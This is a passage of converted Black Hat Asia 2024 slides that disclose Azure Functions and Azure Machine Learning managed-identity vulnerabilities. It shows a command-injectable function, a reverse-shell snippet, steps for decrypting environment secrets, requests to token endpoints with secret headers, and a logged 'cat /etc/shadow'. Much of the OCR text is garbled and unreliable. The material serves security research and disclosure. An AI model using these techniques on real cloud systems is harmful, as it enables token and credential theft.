---
title: "Breaking Managed Identity Barriers In Azure Services"
speakers: ["Nitesh Surana", "David Fiser"]
conference: "Black Hat"
conference_full: "Black Hat ASIA 2024"
edition: "ASIA"
year: 2024
source_pdf: "BlackHat ASIA 2024-Slides/Nitesh Surana & David Fiser-Breaking Managed Identity Barriers In Azure Services.pdf"
pages: 98
sha256: "00e9ea402558bb6b676b8d17ed4c45ec07150145c85afb1f1d481301a52fc4ae"
text_chars: 30783
ocr_pages: 44
has_ocr: true
redacted_secrets: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T00:50:42Z"
---
# Breaking Managed Identity Barriers In Azure Services

**Speakers:** Nitesh Surana, David Fiser  
**Conference:** Black Hat ASIA 2024  
**Source:** `BlackHat ASIA 2024-Slides/Nitesh Surana & David Fiser-Breaking Managed Identity Barriers In Azure Services.pdf` (98 pages)


## Slide 1

#### Breaking Managed Iden-ty Barriers in Azure Services

David Fiser, Nitesh Surana

#BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
—” ~~
bisekhat—
ASIAZORIS y 2 SS
, mn e Ni ' ZL e - = — ¢ |
Breaking Managed Identity
Barriers in Azure Services
David Fiser, Nitesh Surana
#BHASIA @BlackHatEvents
```

## Slide 2

- From Sikkim, India

- Senior Threat Researcher (Cloud)

- Presented at Black Hat USA, HITB, HackInParis...

- VulnerabiliBes in cloud services via Zero Day IniBaBve

• X: @_niteshsurana || Web: niteshsurana.com

#BHASIA  @BlackHatEvents

## Slide 3

#BHASIA  @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
pisek hat
ASIA 2024
Microsoft Azure Service Fabric WAagent Exposure of Resource to Wr
Disclosure Vulnerability
ZDI-23-002
ZDI-CAN-18519
CVEID CVE-2023-21531
CVSS SCORE 5.3, (AV:L/AC:H/PR:H/UI:N/S:C/C:H/I|:N/A:N)
AFFECTED VENDORS Microsoft
AFFECTED PRODUCTS Azure
VULNERABILITY DETAILS = This vulnerability allows local attackers to disclose sensitive information on Micr
ability to execute high-privileged code within a container on the target system in
The specific flaw exists within the WAagent daemon. The issue results from insu
attacker can leverage this vulnerability to disclose stored credentials, leading to
ADDITIONAL DETAILS Microsoft has issued an update to correct this vulnerability. More details can be
https:/msrc.microsoft.com/update-guide/vulnerability/CVE-2023-21531 ,
DISCLOSURE TIMELINE 2022-09-20 - Vulnerability reported to vendor
2023-01-18 - Coordinated public release of advisory
CREDIT David Fiser (Trend Micro - Proiect Nebula)
```

## Slide 4

##### The Art

Azure Functions

Azure Machine Learning

Managed Identities

#BHASIA  @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
pisek hat
ASIA 2024
The Art
Azure Functions
9)
Azure Machine Learning
&
Managed Identities
#BHASIA @BlackHatEvents
```

## Slide 5

##### The Ar(sts

#BHASIA  @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
pisek hat
ASIA 2024
The Artists
#BHASIA
@BlackHatEvents
```

## Slide 6

### EPISODE I: Azure Functions

#BHASIA  @BlackHatEvents

## Slide 7

##### Azure Func(ons

- Serverless plaNorm

- User code inside CSP

#BHASIA  @BlackHatEvents

## Slide 8

##### Azure Functions

Any user code!?

• Running user code

```
import azure.functions as func
import os
```

```
defmain(req: func.HttpRequest) -> func.HttpResponse:
val = req.params.get('msg')
```

```
return check_output("echo '{0}'".format(val), shell=True)
```

#BHASIA  @BlackHatEvents

## Slide 9

##### Azure Functions

- AuthenBcaBon

• Triggers

#BHASIA  @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bi§tkhat | _
ASIA 2024 = < N
Azure Functions
e Authentication
° Triggers
#BHASIA @BlackHatEvents
```

## Slide 10

##### Research

- Simulation of compromise

- Analysis of environment

- Configuration changes

#BHASIA  @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
pigtichak = 4“ _k _ aN A = a
ASIA 2024 AEE
Research
. . . 2 cos 7) : “scriptFile": "_init_.py",
e Si aa U lat | Oo n of co aa p ro aa ise ; import azure. functions as func ; ee [
5 5 “authLevel": "function",
6 def main(req: func.HttpRequest) -> func.HttpResponse: 6 "type": “httpTrigger",
7 s=socket. socket (socket.AF_INET, socket. SOCK_STREAM) 7 “direction": "in",
8 s.connect( -4242)) 8 “name": “rea”,
coee ubuntu@ip-172-26-1-174: ~ X31
. .
¢ Analysis of environment # whoa
root
# 1s
ls
headers host.json oryx-manifest.toml requirements.txt reverse
. . # pwd
¢ Configuration changes Pe cement
«i
#BHASIA @BlackHatEvents
```

## Slide 11

##### Authentication

- Tokens

- Client certificate

- Custom logic

#BHASIA  @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
=a
Authentication
¢ Tokens
ASIA 2024
pisek hat
®
Y
©
LY
=
Y
—
se)
O
Y
Cc
v
oS)
e
¢ Custom logic
@BlackHatEvents
#BHASIA
```

## Slide 12

##### Triggers

• HTTP(s) request

- Events

#BHASIA  @BlackHatEvents

## Slide 13

##### Timeouts

5 m

4.5 m

#BHASIA  @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
— Ja S wre
(+) a \ eo . a
bladkhat = — Ee
Timeouts
45m
#BHASIA @BlackHatEvents
```

## Slide 14

##### Environment analysis

- whoami

- mount, capsh

- env

#BHASIA  @BlackHatEvents

## Slide 15

##### Environment variables

- Popular pracBce in DevOps

- OWen stores secrets

   - References as a **!!! VAULT !!!**

#BHASIA  @BlackHatEvents

## Slide 16

##### Environment variables

###### • Fundamentals

unless a new table **passed as arguments**

#BHASIA  @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
x Pa ™ p
Oo nat es =a i
Environment variables
¢ Fundamentals
0@e@e root@ip-172-26-1-174: /home/ubuntu X31 |
root@ip-172-26-1-174:/home/ubuntu# 1s /proc/1
attr cmdline | environ | io mem ns pagemap schedstat stat timers
autogroup comm exe limits mountinfo numa_maps personality sessionid statm uid_map
auxv coredump_filter fd loginuid mounts oom_adj projid_map setgroups status wchan
cgroup cpuset fdinfo map_files mountstats oom _score root smaps syscall
clear_refs owd gid_map maps net oom_score_adj sched stack task
root@ip-172-26-1-174:/home/ubuntut fj
unless a new table passed as arguments
#BHASIA @BlackHatEvents
```

## Slide 17

#BHASIA  @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
—__——— -
bk cee ubuntu@ip-172-26-1-174: ~/env_test &
ubuntu@ip-172-26-1-174: $ nano main.cpp
ubuntu@ip-172-26-1-174: $ g++ main.cpp -o app
ubuntu@ip-172-26-1-174: $ cat main.cpp
#include <Lostream>
using namespace std;
int mainCint argc, char** argv){
cout << "Hello World” << endl;
return 0;
}
ubuntu@ip-172-26-1-174; $ export API_KEY«SuperSecretValue@123
ubuntu@ip-172-26-1-174: $ qdb app
zx
: OxOO7FFFFFFFeESZ8 [+ [OxOO7FFFFFFfe775 + “XDG_SESSION_ID=59847"
: OxOO7FFFFFFFES30 [+ Oxd0000000400E00 +) <_libc_csu_imit+O> push 15
rop : OxO07fffffffe43@ + O@x000000004008d0 +9 <_1ibc_csu_init+@> push ri15
$rsi : @xOO7fffFFffeS18 + O@xO07fffffffe7Sb +] “/home/ubuntu/env_test/app"
$rdi ss Oxi
$rip : @x0000000040084a + <main+4> sub rsp, Q910
$r8 : OxOO7FFFF7dd4acO + OxO07fFFF7dcf838 OxOO7fffFF7D76f60 + <std::num
pf x/32bs @x007F FF FFFFE77S
"XDG_SESSION_ID=59847"
If “APE. tt veduperSecretibalueti23”
+ #8 oe ee
“XDG_DATA_DIRS=/usr/Local/share: /usr/share:/var/Lib/snapd/desktop”
“LESSOPEN=| /usr/bin/lesspipe %s"
Ma pasrncngt heated
_get<wchar_t,+@> mov rax, QWORD PTR [rip+@x25a
ts
```

## Slide 18

##### Environment variables

Is this some debugger magic?

https://github.com/torvalds/linux/blob/23956900041d968f9ad0f30db6dede4 #BHASIA  @BlackHatEvents daccd7aa9/fs/binfmt_elf_fdpic.c#L64

#BHASIA  @BlackHatEvents

## Slide 19

###### **AzureWebJobsStorage**

###### **CONTAINER_ENCRYPTION_KEY**

###### **CONTAINER_START_CONTEXT_SAS_URI**

#BHASIA  @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
elestzbesszozizisis J LL) ) | st; tanle & 1G TOeeet TT Te re revereriririre reece rire
mirGOOfiGGa1i11ieeaia 61 11880188111118818 881 1188180011
Stree atthe 88+ ge Set + geet bye B84 +449 001 | |
= ees ey o,00000, 79 118 9 200,118 , 80000 8 110 9 200,116,080
a ee rn 811,118008 1 018 ; 88 81a ; 1600 1 8108 ; 88 ue
arr visi || 8 119 ;8811lig ,@8I1Gilo 11g ,e8i)110,0
: H0000 oi080 10 poh: SRE oie080 10; ; ie8ece,)
PINSIG + NaTMMeTH TOK} -a69Ree725 064-14 Bele? aquepoi. 'i.an901 ti. '1eMGa11!1
AzureWebJobsStorage
CONTAINER_ENCRYPTION_KEY
CONTAINER_START_CONTEXT_SAS_URI
COMMRINER ee dossigssz oo ; , o 1 Oo 1 *
a ora ://wawsstorageprodam2177 .bldb. core .windows qz iners/Of8e ronda
yeaa Pease 2022 “2AT ; -@1-24T15%3A34: ; 7 o Q Q ‘
]
nESITE< =e rety » 4g et » ag ror
a a 2. core.windows . net/azcontainels/0f8ec002- olbarasr @2- — someon olan
ETTING_WEBSITE.
E_STAMP_DEPL( LPs)
sue a 75E06393876AE07396841AF8 is] o
| G oO
s ://storageaccountdef; bd) -net/scm-releases/scm- |= ‘-nebula-' cefip?svaz014-02- sant - cine: samen -1bibr12x3A04x3006zesp—rw o
Sipe Sorvicemcnampecervice. . Caas-10208470f e9:
```

## Slide 20

##### AzureWebJobsStorage

source code

Azure Function

Storage Account

#BHASIA  @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
pis hat
ASIA 2024
—fO~ < @ O
YOU HAVE BEEN HACKED!!!
AzureWebJobsStorage
Not Secure — nebula-test.azurewebsites.net
#BHASIA @BlackHatEvents
```

## Slide 21

##### CONTAINER_START_CONTEXT_SAS_URI

`{{ "encryptedContext" : "Lk8nHZ/2m+6TGuK0pfhtNA==./cYdq+AnpWjICTECMSDgT5SsgFPGm6ouZFtlY7UzQUXvdEiE"encryptedContext" : "` **`AES_IV . payload . SHA256`** `" }kDsDSQreIAZNoeFRcIUmFuZG9tIENoYXJhY3RlciBHZW5lcmF0b3IKCkJhcmRvdCBCcnVzaApo dHRwczovL2JhcmRvdGJydXNoLmNvbSDigLogY2hhcmFjdGVyLWdlbmVyYXRvcgoKVGhpcyB0b2 9sIGdpdmVzIHlvdSBpZGVhcyBmb3IgdW5pcXVlIGNoYXJhY3RlcnMgdG8gZHJhdyEgVXNlIHRo ZSBkZXNjcmlwdGlvbiB0byBkZXRlcm1pbmUgdGhlIGNoYXJhY3RlcidzIHBoeXNpY2FsIGFwcG VhcmFuY2UgYXMgd2VsbCBhcyB0aGVpciBzdXJyb3VuZGluZ3MsIC4uLgoKQdoZW4geW91IHByZ XNzIHRoZSBidXR0b25zLCB0aGV5IHdpbGwgZ2VuZXJhdGUgLi4uCg==.YWJjZGVmZ2hpamtsbW 5vcHFydHN0YXNma2FzZmQ5NHUwMjNmYXM5MDAxZmtlaWxpZXV5Nzk3OTcyMTM0MTI0NA=="` **CONTAINER_ENCRYPTION_KEY** `}`

#BHASIA  @BlackHatEvents

## Slide 22

#BHASIA  @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Recipe
From Base64
Alphabet
A-Za-z0-9+/=
Remove non-alphabet chars
AES Decrypt
Key
jaXOvBRs4j vnYKSghsOIbt@7B5+LeYmnTd1BbM...
IV
Lk8nHZ/2m+6TGuK@pf htNA==
Mode Input Output
CBC Raw Raw
Ou
BASE64 ~
BASE64 +
length: 9196
lines: 1
+O8) © &
/cY¥dq+AnpWj ICTECMSDgT5SsgFPGgm6ouZIL2DHqQVF92aun+3ZGuz79neYZQNaC6Zq4htv2WPL1u/0Z7g@WIIDreYyLVME7alLzS
WNd4cAzWL/bBHZSH8 iedj LUVasR9@U8qYoN1TR1Y5mqCPesCHFDmDOqUoZQUHYmco290YqnpGFLLFt LY7UZQUXvVdEiEkDsDSQrelA.
NoeFRcIvnEZ/Hkaa4yeyg214b1TBz71cT7Lf/TFG3F0783HzpwgvEe Lbu+HWAWV f d8WK9MOe0y8q4eHKvqwa9uqXBTSfLbNr2oUms
GSWPFwQTZPYcL4dUmiNm2yusw1fkwa6dJmPC7pXcSh5e4CDec8/RCVizmWNQufkg1Yp7B19QKUf@K4n0QR233zdsbkX1X07pL6j pj!
4hwDOdmipcF6tlcVbMT f4BfPZYyyD1HdY tHLa LndF7 j xrJsu+Qwj BXm7G@88p2KJ LbWromnM3Q0I+VqKSOYRMsoL j XOUK9wfMvcsBi
XjKKRT7cAj gvNRQ6YKGNyhDa21+IHkC6J+bTaXiGirWA8WL1zaHbUe9aGkSAy9rr/hVVrGWiPO79SdN7F f8a2+P9ZVdKNrLXKd5 lA:
qS4x8BmX0/zHmnigMC+@SHEK3C21VQ1z1Pydp9p2ziDEc3IrzsZ86bM6JWxaKkdF fHrQ8 LXt 7EOFMD/H26g lal QXHEzbFBKuZfey2j
RYRMhU49SehAeAdID72DBbSM10/v4ggkLY0zCFy4MVQhj @erDWhvU+iFLt foQQ7ptQ4Z04MrxrCADt repbv4HV/ j vV6iBCLn5@UMeS'
oASFJARq vpJV/tPSDud LINgrRAg8ugcCf77/pgZ6SuT34Dor9zdNxDXg93minj SYnEL2M8Uzc3Zxv+DevBI3SeA4A Lo5Pw8FvJ ih!
94Z1qDHCvQ7 vLUWyNqOuQw3TAUOEuaT4mUmI j zzhMuA j BUDUOEymrH1 LdxuTESYEMhsK1tBGYPbdY zqDYMbENeou+0Gibn8mjLr2i’
nD4x6ATtdDO9Cw8+f Ij AQGRskuazEOyyPf+ingAkj 7Gj jwaL85T LFZSpOykIN6t+BoQQALavdTVOtnQwyd8xBQU9dp56 iMPJBAiU+
BNYXkY6L9GwJQ@3AEDGq40d2qacSndXsagIUElbsB7F fUqI cO6D7Y LnQxVOUCcQ7m@S8QL3ij yHKWQEZszq1IN6gAKoQGr2/3RddDqVv
HGorLHwl7uRARny3BzugR LH+VxGwDRnw/ qrdMvS6vQn30gAvn877alX6/DDGm1icNtV2x fM8X0sWNFb+X4a8tNHhE4Cv5R2qgy lMsP\
t5bwVJP5//1IUbfCj oHJqmX0K4axP9E62H27 LFDSR603Vpe@bOK9x@tuSPLuj poef yqiuJ IFEdUJBDkwC82bmAXLSKEfgsutTDdDy8'
LAJbLPBM1LxH3H3iS18+JuoQ1mm12C fFZwDHDs@i2Ei2a5RLiko@aZVhweE LPNLIw2mDm/5XIJ4iZunlxKi8xLtqODdBvj j CALSWFXD
t5+13gi6czwxv3i6Ypa+YSXrDKJEGIXEwB3v1BL3JLUhSPL3FbKq72Z6LixL6nhd+i/n12+fKAak2m//dj 8ACDRv4 fYU@X3J15Cat
NMdyLsaKeo9UW7E f+6s6BeFv2EhAoK/V ipGPX+DyPw61VvQaHO@Sqk/oKzPo40CoRBD i0yoN4WanvLNOn7SwgzDzvXxXf iYnIOFyuGTH
ysQcXXKs 1CBNynm7@vV9H1vECy2B5UpvE fbknFarwlPX/Q4eqvkRt8L26gKT8JpkBXCJ Tm/GGaUIgX/aj BUbQz1al+YA@2Cy9cVxU!
PA ane en ar te in on ats ee rane nun ant ea nan erin. Reni Wen ata. ken nea an
start: t) a o ra r
end: 6891
length: 6891
{"SiteId":767064730,"SiteName":"nebula-test","EncryptedEnvironment":"3 | VizDzTy30ag/PHD1E7gwWg==
VizDzTy30ag/PHD1E7gwWqhXzQpeguHXICV7FYHwuYGqVJF2pJ iekzHg7Se9pFMSsM3HNtx4Suy499UI qgF8Fe9AhoiJMbE3aD2+3b
Nm5tK4ogMk8 f gGt iLQgELuSugTYq8HoQaG5p+CGGFNI bwhhQbj 2kVy fewd LAESgXADXUPW6+c riRqdJgqvjF6/66kxGJqL3U0QEGk
MedtHb0@318+@KXFq1Ws5SSNBj pcO@rwgRHToIBd1WF rrA09G1AF im3EgHUxB5euM1B81bn9C fKuR5nw2Cdt 8WpktoEWLa7vPwbE62EF
1m69PZIC3L6861INO+nFT1wMgP9UraBeQo+/OwQT rf j UeTDEBI j bKArLA0S/1yBfY fwOXIg5PGmWoi4HedSYnbobScX5n1liwp99BiP
4+MPiU6km35 FWWRp/qquj eChHQPXC9i/ I CPOGWg4UxX LhQbD IMtwkE LSdH1soCMXT knuLSLAW/96WOQNS yhxqj tLQVqh4NzLmwwrhj<
UwPaknHWH@oTYSXW7@Vww88UDgYcqncII1jPwl3d7SawBXVO93t@L+EdQDSVMTK1pFr+h/xuK3s93Q4L+An70R6WUSeI7KYOV fwPG2
12Zm4tzBJxzSnlTbaYTm7NkuKH6e1ZIeAZhat Y4XF f55d+yzSIMBRO3Th5So j wmB@wCEBOgLhEApnLkPy4FNygU/ZOVvd6g fNDpc/Z
ZaBuIUMu1Zk/kEwC6JyKmQf0Owef 2t4ApQM LpC8DWNgI2pGU83 iM f 2meVUMEyxj pEZh2xdj J iHN9dj vSj xpS4Q+4NT2G4n1EimPXS
@XhJ8UwSxZEsD8 j ASXd7TJ3muZ5ss inNcT2KIQKEgj qEQ75nYs 1hMMP2AuQSzs 17e9ePuRt@dw0azT j GuHmmAS61LLESVaRZL/dF3:
CVhTWL5j 6LiKq6CX1U7Lhc/t1lar00YwATN+HBOkgXPFAB)J f J 8npFZzumvQTH4UK04xmXbksWNUJ69JAi800QiezSzfxatW9PRVL1ed
MmN6VPe1Xdiv0JTGwgkgmqj 1e8MnZZv f gaBo3GvCMar0ykXdzKmuRFSWLMHwj CFSNV765pgN81FNz9ur2eNvH768sMal1p9BXxXUa27Y«
AZLC28IqTL60ZQqG@eILglFGoDj ot TNho/DtT3tQhF1SEMqVS/ IAmBvow+f/VArf incj Gwp045udB8Xj TeksVRQuyGHJ vX78QcwKYW:
2Wj mLMOK7YuxAV f vxi@Qej IDwP LFsBxauyMP4c1j GNCnY1LvQIHPeQoV2Xz j tTQD2piBm702X6icE5QKi81B+vG7e5+8UW2WIDGjt
dePnYgbZekgEhj TggpOrPJaC8GtJ/D7y4drEqvvsBS5PpTKRK1Xd90JRM2YHp6odY LcSLPYVU@5ZDrFAGAJYOj FwwxTLG3YNCiLcFe'
Input
time: 3ms
length: 6891
lines: 1
Output
```

## Slide 23

##### Decrypted context

- Authentication tokens

- **Managed identity proxy settings**

#BHASIA  @BlackHatEvents

## Slide 24

##### Managed Identities

Azure Function

Storage Account
STORAGE_ACCOUNT_CREDENTIALS

Image

#BHASIA  @BlackHatEvents

## Slide 25

##### Managed Identities

#BHASIA  @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
A
blackhat
em: LOR OF
A AAA A
if
Managed Identities
GET /msi/token?resource=https : //management .azure.com&api-version=2019-@8-@1 HTTP/1.1
Host: LocaLhost: 8081
User-Agent: curl/7.74.0
Accept: */*
X-IDENTITY-HEADER: 7QDBF9CBQ4554E9E8E210A70CD4D2974
Mark bundle as not supporting multiuse
HTTP/1.1 20@ OK
Date: Thu, 31 Mar 2022 13:06:34 GMT
Content-Type: application/json; charset=utf-8
Server: Kestrel
Transfer-Encoding: chunked
"access_token": "eyJQ@eXAL0iJKV1QiLCIhbGci0iJSUZIINiIsIng1dC16ImpTMVhvMU9XRGpFNTIZYndHTmc
WNDc1MZEt YWULY 1 Q@MmQOLWE4NmQtZDZmMDUON j BmOWU@L yIs ImLhdCI6MTYQODczZMTYSNSwibmJmI joxNjQ4Nzh
ci 161jIiLCJpZHAi0iJodHRwczovL3N@cy53aW5kb3dzLm5LdC8zZTA@NZUZYS1hZTViLTQyZDQtYTg2ZC1kNmYv
#BHASIA
cachet —— = 2 4 =< ~
@BlackHatEvents
```

## Slide 26

##### Managed Identities

#BHASIA  @BlackHatEvents

## Slide 27

##### Findings

- Environment variables

- Proxy parameters

- **Valid JWT tokens outside Azure**

#BHASIA  @BlackHatEvents

## Slide 28

#BHASIA  @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
david_fiser@CZ-64PZE33B LeakPoC % 1s
Microsoft .AspNetCore.Mvc. Versioning. dll
Microsoft .Extensions.Logging.Abstractions.d11
Microsoft. IdentityModel .Clients.ActiveDirectory.dll
README . txt
david_fiser@CZ-64PZE33B LeakPoC % python3 Leak. pyff
System. Composition.AttributedModel .d11
TokenServiceContainer.d11
TokenServiceContainer.pdb
leak. py
log4net dll
test1.deps.json
test1.dl1
test1.exe
test1.pdb
test1.runtimeconfig.dev. json
test1.runtimeconfig. json
```

## Slide 29

##### Why?

- Environment variables popularity

- Not knowing fundamentals

- Ignoring the risks

#BHASIA  @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
blackchat \ “aa,
Whyr
¢ Environment variables popularity
¢ Not knowing fundamentals
° Ignoring the risks
#BHASIA @BlackHatEvents
```

## Slide 30

What do you suggest David?

#BHASIA  @BlackHatEvents

## Slide 31

##### Why?

#BHASIA  @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
ad —- —
bi§ekhat :
ASIA 2024
Why: ram (argc + 5) * ( *);
eee f-~  < @ © Not Secure — nebula-custom.azurewebsites.net @ ® (5 + 68
Cloud
Stronger Cloud Security in Azure Functions
Using Custom Cloud Container
11 ceyvudi Yo )>
ret;
#BHASIA @BlackHatEvents
```

## Slide 32

Disclosure Timeline

04 / 22 – Issue found 05 / 22 – Issue shared with MS 06 / 22 – blogpost released 07 / 23 NetSPI discovers the issue 09 / 23 Fix in progress

hNps://www.netspi.com/blog/technical/cloud-penetraPon-tesPng/mistaken-idenPty-azure-funcPon-apps/

#BHASIA  @BlackHatEvents

## Slide 33

### EPISODE II: Azure ML

#BHASIA  @BlackHatEvents

## Slide 34

#BHASIA  @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
pis hat
ASIA 2024
2 Copilot Azure OpenAl Service
Your everyday Al companion
Document1
Home insert Layout References Review View’ Help
Aptos (Body) vy wv B E Uv #v Avy eee
< » Create content with Copilot
draft a proposal from yesterday's J { meeting notes|
% O
#BHASIA @BlackHatEvents
```

## Slide 35

#BHASIA  @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
pplied Al Services
A
\ Bot Service | Cognitive Search | Form Recognizer | Video Indexer | Metrics Advisor | Immersive aw,
Cognitive Services
Vision Speech Language Decision
Azure Machine Learning
ag
Azure OpenAl Service
ds
Prepare & Preprocess | Build, Train & Consume | Deploy & Scale | Manage & Monitor
#BHASIA
@BlackHatEvents
```

## Slide 36

##### Azure Machine Learning

#BHASIA  @BlackHatEvents

## Slide 37

##### Storage Account

Jupyter Notebooks
Datasets Logs
Models Snapshots
Python Scripts

#BHASIA  @BlackHatEvents

## Slide 38

##### Compute Instance

Jupyter
GPU Drivers VSCode
Conda Docker
PyTorch Python
TensorFlow

#BHASIA  @BlackHatEvents

## Slide 39

##### Compute Instance

#BHASIA  @BlackHatEvents

## Slide 40

##### Approach

- Inspect network traffic

- Running processes

- Reverse CSP agents

- Examine default logs

#BHASIA  @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bifekhat 4. eee —— ==
ASIA 2024
Approach
¢ Inspect network traffic
* Running processes
* Reverse CSP agents
° Examine default logs
#BHASIA @BlackHatEvents
```

## Slide 41

#BHASIA  @BlackHatEvents

## Slide 42

#BHASIA  @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
oa
A _— - ad
lackh - yo. N
b ASIA hat Zé \x co
Storage
. Account's
| Access Key
™ Managed
», Identities
#BHASIA
```

## Slide 43

User Assigned Managed IdenBty

#BHASIA  @BlackHatEvents

## Slide 44

System Assigned Managed IdenBty
System Assigned Managed Identity

#BHASIA  @BlackHatEvents

## Slide 45

#BHASIA  @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bifekhat = <7 _ an ane Lee = a
ASIA 2024 ’ as
Sign in with a managed identity
On resources configured for managed identities for Azure resources, you can sign
in using the managed identity. Signing in with the resource's identity is done
through the --identity flag.
Azure CLI [fy Copy Open Cloudshell
az login --identity
#BHASIA @BlackHatEvents
```

## Slide 46

##### az login --identity

GET /MSI/auth/?resource=https://management.core.windows.net/&apiversion=2017-09-01 HTTP/1.1 Host: 127.0.0.1:46808 User-Agent: python-requests/2.31.0 Accept-Encoding: gzip, deflate Accept: */* Connection: keep-alive secret: 6cvsqlMIRvIyURbztZ3P

idenBtyresponderd

#BHASIA  @BlackHatEvents

## Slide 47

##### identityresponderd

#BHASIA  @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
piStkhat - —— __ a as — | = a
identityresponderd
[Unit ]
Description=Azure Batch AI Identity Responder Daemon
EnvironmentFile=-/etc/environment
EnvironmentFile=-/etc/environment.sso
EnvironmentFile=-/mnt/batch/tasks/startup/wd/dsi/dsixdsenv
WorkingDirectory=/mnt/batch/tasks/startup/wd
-— bet feet er te at let |! pete «
a |
i |
ie
4
|
#BHASIA @BlackHatEvents
```

## Slide 48

##### identityresponderd

/etc/environment.sso

/mnt/azmnt/.nbvm

#BHASIA  @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
piSdkhat a a All __ —S =
identityresponderd
/etc/environment.sso =m MST_ENDPOINT=http://127.0.0.1:46808/MSI/auth
MST_SECRET=6cvsq LMIRvVIyURbztZ3P
/mnt/azmnt/.nbvm
i
certurl=https://<REGION>.cert.api.azureml.ms/nbip/token
#BHASIA @BlackHatEvents
```

## Slide 49

##### Outbound Traffic from identityresponderd

POST

/nbip/token/subscripMons/<SUB>/resourceGroups/<RG>/workspaces/<WS>/comput es/<CI_NAME>

Host: <REGION>.cert.api.azureml.ms certThumbprint=<THUMBPRINT> instanceld=<CI_NAME> resource=hWps%3А%2F%2Fmanagement.core.windows.net%2F

_/mnt/batch/tasks/startup/certs/_ sha1-<THUMBPRINT>.{pem,key}

#BHASIA  @BlackHatEvents

## Slide 50

identityresponderd

200 OK with M.I. JWT

#BHASIA  @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
A
blackhat
ASIA 2024
ya
~
[00
nk
identityresponderd
y,
=¢
200 OK with M.1. JWT
#BHASIA
```

## Slide 51

401 Unauthorized

#BHASIA  @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
A
blackhat
ASIA 2024
etc crcee: =
I \
I |
|
(
| |
wy I
. wv .
I |
401 Unauthorized
\ ]
ee ee ee -
#BHASIA @BlackHatEvents
```

## Slide 52

# ≠

#BHASIA  @BlackHatEvents

## Slide 53

##### Let’s see _everything_

#BHASIA  @BlackHatEvents

## Slide 54

##### dsimountagent

#BHASIA  @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
biSekhat ra —— = a3 me
ASIA 2024
dsimountagent
[Unit]
Description=Azure Batch AI DSI Mounting Agent
Wr
WorkingDirectory=/mnt/batch/tasks/startup/wd/dsi
ExecStart=/mnt/batch/tasks/startup/wd/dsimountagent
StandardOutput=syslog
StandardError=syslog
Syslogidentifier=dsimountagent
Cs, EnvironmentFile=/mnt/batch/tasks/startup/wd/dsi/dsimountagentenv
|
-o-
#BHASIA @BlackHatEvents
```

## Slide 55

Spying The Scien(st

/ci-api/v1.0/services/jupyter/logs

azureuser : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND= **/usr/bin/cat /etc/shadow**

#BHASIA  @BlackHatEvents

## Slide 56

##### Spying The Scien(st

<u>h"ps://msrc.microso-.com/update-guide/vulnerability/CVE-2023-28312</u>

#BHASIA  @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
— Ss : mr
biSekhat A __g C ae
ASIA 2024 es i “Ne o-
| MLSEQ | Spying The Scientist
Azure Machine Learning Information Disclosure Vulnerability
CVE-2023-28312
Security Vulnerability
Released: Apr 11, 2023 Last updated: Aug 22, 2023 wy
Assigning CNA: © Microsoft
CVE-2023-28312 &
Impact: Information Disclosure Max Severity: Important
CVSS:3.16.5/5.7 ©
#BHASIA @BlackHatEvents
```

## Slide 57

##### Config of dsimountagent

A section of environment variables used by DSIMountAgent

#BHASIA  @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
piSdkhat a —— — _-
ASIA 2024
Config of dsimountagent
AZ_LS_ENCRYPTED_SYMMETRIC_KEY=eyJraWQi0iJCNUQxMTc@MTRDOUYXODA1MEI4MeYyRI
AZ_BATCHAI_CLUSTER_CERTIFICATE_PEM=----- BEGIN PRIVATE KEY----- 3 localKey:
AZ_BATCHAI_CLUSTER_PRIVATE_KEY_PEM=----- BEGIN PRIVATE KEY----- ;localKey:
AZ_BATCHAI_XDS_ENDPOINT=https://eastasia.cert.api.azureml.ms/xdsbatchai
A section of environment variables used by DSIMountAgent
#BHASIA @BlackHatEvents
```

## Slide 58

##### Purpose of dsimountagent

checks & mounts

File Share

every 120s

Compute Instance

#BHASIA  @BlackHatEvents

## Slide 59

dsimountagent

$AZ_BATCHAI_XDS_ENDPOINT

#BHASIA  @BlackHatEvents

## Slide 60

##### Outbound Traffic from dsimountagent

#BHASIA  @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Outbound Traffic from dsimountagent
